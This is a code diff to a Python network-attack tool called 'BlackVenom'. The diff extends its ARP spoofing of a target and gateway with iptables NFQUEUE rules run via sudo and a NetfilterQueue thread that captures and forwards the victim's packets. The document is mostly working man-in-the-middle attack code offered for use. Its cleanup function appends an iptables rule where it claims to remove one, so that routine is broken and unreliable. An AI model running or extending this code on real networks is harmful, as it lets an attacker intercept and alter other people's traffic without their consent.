@@ -1,10 +1,13 @@
+import os
 import socket
 import sys
+import threading
 import time
 import logging
-from scapy.all import Ether, ARP, srp, send
+from scapy.all import Ether, ARP, srp, send, IP
 from tqdm import tqdm
 import netifaces
+from netfilterqueue import NetfilterQueue
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
@@ -33,41 +36,46 @@ class BlackVenom:
         print(f"🖥️ Local IP Address ({self.interface}): {self.local_ip}")
         print(f"🔗 Local MAC Address ({self.interface}): {self.local_mac}") 
 
-    def spoofing(self, target_ip, gateway_ip):
+    def spoofing(self, target_ip, gateway_ip, queue_num=1):
         """
-        Runs the ARP spoofing process indefinitely until interrupted.
-
-        Args:
-            target_ip (str): IP address of the target machine.
-            gateway_ip (str): IP address of the gateway.
+        Execute the ARP spoofing process and then start packet interception.
         """
         print("🕸️ ** BlackVenom Activated **")
-        print("🔮 Entering the shadows... ARP Spoofing in progress...")  
-        
-        # Variable to track if spoofing has been successfully activated
-        spoofed_successfully = False
+        print("🔮 ARP Spoofing in progress...")  
 
+        spoofed_successfully = False
+        
         try:
             while True:
-                self._spoof_bidirectional(target_ip, gateway_ip, verbose=not spoofed_successfully)
+                # Perform ARP spoofing
+                self._spoof_bidirectional(target_ip, gateway_ip, not spoofed_successfully)
 
-                # Indicate the first successful spoofing
+                # Once successfully spoofed, initiate packet interception
                 if not spoofed_successfully:
-                    print(f"🔒 Successfully spoofed {target_ip} to think we're {gateway_ip}.")
+                    print(f"🔒 Successfully spoofed {target_ip} into thinking we're {gateway_ip}.")
                     spoofed_successfully = True
 
+                    # After successful spoofing, start the packet interceptor
+                    print("🎯 Starting packet interception on the victim's communication...")
+                    self._run_iptables(queue_num)
+                    
+                    # Intercept packets in a separate thread so spoofing can continue
+                    self.packet_thread = threading.Thread(target=self.run_packet_interceptor, args=(queue_num,))
+                    self.packet_thread.start()
+
                 for i in range(1, 4):
-                    sys.stdout.write(f"\r🔄 Spoofing in progress{'.' * i} Target: {target_ip} | Gateway: {gateway_ip} ")
+                    sys.stdout.write(f"\r🔄 Spoofing in progress{'.' * i} ")
                     sys.stdout.flush()
                     time.sleep(0.5)
-                
-                time.sleep(0.5)  # Pausa antes de la próxima iteración principal
 
-                time.sleep(1)
+                time.sleep(0.5)
+
         except KeyboardInterrupt:
-            print("🛑 Stopping ARP Spoofing. Restoring the network...")
+            print("\n🛑 Stopping ARP Spoofing. Restoring network...")
             self._restore_bidirectional(target_ip, gateway_ip)
-            print("✅ ARP Spoofing stopped. Network has been restored. Returning to the shadows...")
+            self._clear_iptables()
+            self.stop_packet_interception() 
+            print("✅ ARP Spoofing stopped. Network restored.")
 
     def _enable_ip_forwarding(self):
         """
@@ -216,6 +224,61 @@ class BlackVenom:
 
         if verbose:
             print(f"🕸️ ARP table for {target_ip} has been restored to its rightful state! 🖤")
+
+    def _run_iptables(self, queue_num=1):
+        """
+        Set up iptables rules to intercept packets and send them to NetfilterQueue.
+        """
+        print("⚙️ Setting up iptables rules...")
+        os.system(f"sudo iptables -A FORWARD -j NFQUEUE --queue-num {queue_num}")
+        print(f"✅ iptables NFQUEUE rules set for intercepting packets.")
+
+    def _clear_iptables(self):
+        """
+        Clear the iptables rules created for NetfilterQueue.
+        """
+        print("🧹 Clearing iptables rules...")
+        os.system(f"sudo iptables -A FORWARD -j NFQUEUE")
+        print(f"✅ iptables NFQUEUE rules cleared.")
+
+    def _intercept(self, packet):
+        """
+        This function is called by NetfilterQueue for each packet that
+        passes through the queue. It extracts the packet's payload, 
+        converts it into a Scapy IP packet, displays it, and then forwards it.
+
+        Args:
+            packet (scapy.Packet): The packet currently being processed.
+        """
+        payload = packet.get_payload()
+        spkt = IP(payload)
+        print("📦 [+] Packet received:")
+        packet.set_payload(bytes(spkt))  # Set the modified packet payload
+        packet.accept()  # Forward the packet
+
+
+    def run_packet_interceptor(self, queue_num=1):
+        """
+        Run the packet interceptor using NetfilterQueue.
+        """
+        self.nfqueue = NetfilterQueue()
+        self.nfqueue.bind(queue_num, self._intercept)
+        print(f"📡 Intercepting packets on queue {queue_num}...")
+        # Start processing the queue to handle packets
+        self.nfqueue.run()
+
+    def stop_packet_interception(self):
+        """
+        Safely stops the packet interception thread by terminating the NetfilterQueue
+        and unbinding it from the queue.
+        """
+        if self.packet_thread and self.packet_thread.is_alive():
+            # Stop the NetfilterQueue processing loop
+            print("🛑 Unbinding NetfilterQueue and stopping interception...")
+            self.nfqueue.unbind()  # Unbind the NetfilterQueue to stop packet handling
+            print("✅ Packet interception thread stopped.")
+            # Wait for the packet thread to terminate
+            self.packet_thread.join()
 
     def _print_banner(self):
         """
